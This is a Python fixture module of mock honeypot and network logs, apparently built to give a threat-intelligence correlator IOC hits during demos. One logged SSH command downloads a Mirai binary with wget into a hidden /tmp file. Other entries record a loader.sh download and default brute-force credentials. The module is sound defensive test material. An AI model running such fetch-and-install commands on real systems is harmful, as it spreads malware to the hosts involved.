"""Sample honeypot and network logs for demo correlation.

These logs deliberately contain IOCs from mock_feeds.py so that the
correlator produces hits during demonstration runs.
"""

from __future__ import annotations

# ======================================================================
# Honeypot JSONL logs -- each dict is one log line
# ======================================================================
SAMPLE_HONEYPOT_LOGS: list[dict] = [
    # --- Hits (contain known-bad IOCs) ---
    {
        "timestamp": "2026-03-24T02:14:33Z",
        "sensor": "cowrie-ssh-01",
        "event_type": "login_attempt",
        "src_ip": "198.51.100.23",
        "dst_ip": "10.0.0.50",
        "protocol": "ssh",
        "username": "root",
        "password": "admin123",
        "message": "SSH brute-force login attempt from 198.51.100.23",
    },
    {
        "timestamp": "2026-03-24T02:14:35Z",
        "sensor": "cowrie-ssh-01",
        "event_type": "command",
        "src_ip": "198.51.100.23",
        "dst_ip": "10.0.0.50",
        "protocol": "ssh",
        "command": "wget http://198.51.100.23:8080/bins/mirai.arm7 -O /tmp/.bot",
        "message": "Post-login command execution",
    },
    {
        "timestamp": "2026-03-24T03:22:10Z",
        "sensor": "dionaea-01",
        "event_type": "connection",
        "src_ip": "203.0.113.42",
        "dst_ip": "10.0.0.51",
        "protocol": "smb",
        "dst_port": 445,
        "message": "SMB connection from known ransomware distributor",
    },
    {
        "timestamp": "2026-03-24T04:10:55Z",
        "sensor": "cowrie-ssh-01",
        "event_type": "file_download",
        "src_ip": "198.51.100.77",
        "dst_ip": "10.0.0.50",
        "url": "http://198.51.100.77/loader.sh",
        "sha256": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
        "message": "Malicious payload downloaded",
    },
    {
        "timestamp": "2026-03-24T05:30:00Z",
        "sensor": "web-honeypot-01",
        "event_type": "http_request",
        "src_ip": "203.0.113.99",
        "dst_ip": "10.0.0.52",
        "protocol": "http",
        "request_url": "https://phish-login.badactor.top/wp-login.php",
        "method": "POST",
        "message": "Credential phishing redirect detected",
    },
    {
        "timestamp": "2026-03-24T06:45:12Z",
        "sensor": "cowrie-ssh-01",
        "event_type": "login_attempt",
        "src_ip": "192.0.2.15",
        "dst_ip": "10.0.0.50",
        "protocol": "ssh",
        "username": "admin",
        "password": "password",
        "message": "Repeated SSH brute-force from open proxy",
    },
    # --- Clean traffic (no IOC matches expected) ---
    {
        "timestamp": "2026-03-24T07:00:00Z",
        "sensor": "cowrie-ssh-01",
        "event_type": "login_attempt",
        "src_ip": "192.168.1.100",
        "dst_ip": "10.0.0.50",
        "protocol": "ssh",
        "username": "test",
        "password": "test",
        "message": "Internal scan - benign",
    },
    {
        "timestamp": "2026-03-24T07:15:00Z",
        "sensor": "dionaea-01",
        "event_type": "connection",
        "src_ip": "10.0.0.1",
        "dst_ip": "10.0.0.51",
        "protocol": "tcp",
        "dst_port": 80,
        "message": "Internal health check",
    },
    {
        "timestamp": "2026-03-24T08:00:00Z",
        "sensor": "web-honeypot-01",
        "event_type": "http_request",
        "src_ip": "172.16.0.5",
        "dst_ip": "10.0.0.52",
        "protocol": "http",
        "request_url": "/index.html",
        "method": "GET",
        "message": "Internal web request",
    },
]

# ======================================================================
# Network baseline alert logs
# ======================================================================
SAMPLE_NETWORK_LOGS: list[dict] = [
    # --- Hits ---
    {
        "timestamp": "2026-03-24T01:05:22Z",
        "source": "zeek",
        "event_type": "dns_query",
        "src_ip": "10.0.0.100",
        "dns_query": "malware-c2.evil.xyz",
        "query_type": "A",
        "message": "DNS resolution for known C2 domain",
    },
    {
        "timestamp": "2026-03-24T01:05:23Z",
        "source": "zeek",
        "event_type": "connection",
        "src_ip": "10.0.0.100",
        "dst_ip": "198.51.100.23",
        "dst_port": 8080,
        "protocol": "tcp",
        "duration": 45.2,
        "bytes_sent": 1024,
        "bytes_recv": 524288,
        "message": "Outbound connection to malicious host",
    },
    {
        "timestamp": "2026-03-24T02:30:00Z",
        "source": "suricata",
        "event_type": "alert",
        "src_ip": "10.0.0.101",
        "dst_ip": "203.0.113.42",
        "rule_id": 2024897,
        "severity": 1,
        "message": "ET MALWARE Possible ransomware beacon to 203.0.113.42",
    },
    {
        "timestamp": "2026-03-24T03:00:15Z",
        "source": "zeek",
        "event_type": "dns_query",
        "src_ip": "10.0.0.102",
        "dns_query": "dropper.darknet.ru",
        "query_type": "A",
        "message": "DNS query for known dropper domain",
    },
    {
        "timestamp": "2026-03-24T04:00:00Z",
        "source": "firewall",
        "event_type": "blocked",
        "src_ip": "198.51.100.77",
        "dst_ip": "10.0.0.200",
        "dst_port": 22,
        "protocol": "tcp",
        "message": "Inbound SSH blocked from known cryptominer distributor",
    },
    {
        "timestamp": "2026-03-24T05:00:00Z",
        "source": "suricata",
        "event_type": "alert",
        "src_ip": "10.0.0.103",
        "dst_ip": "203.0.113.99",
        "rule_id": 2025001,
        "severity": 2,
        "message": "ET PHISHING Outbound connection to phishing host 203.0.113.99",
    },
    # --- Clean traffic ---
    {
        "timestamp": "2026-03-24T06:00:00Z",
        "source": "zeek",
        "event_type": "dns_query",
        "src_ip": "10.0.0.100",
        "dns_query": "www.google.com",
        "query_type": "A",
        "message": "Normal DNS query",
    },
    {
        "timestamp": "2026-03-24T06:30:00Z",
        "source": "firewall",
        "event_type": "allowed",
        "src_ip": "10.0.0.100",
        "dst_ip": "8.8.8.8",
        "dst_port": 53,
        "protocol": "udp",
        "message": "Outbound DNS to Google resolver",
    },
]
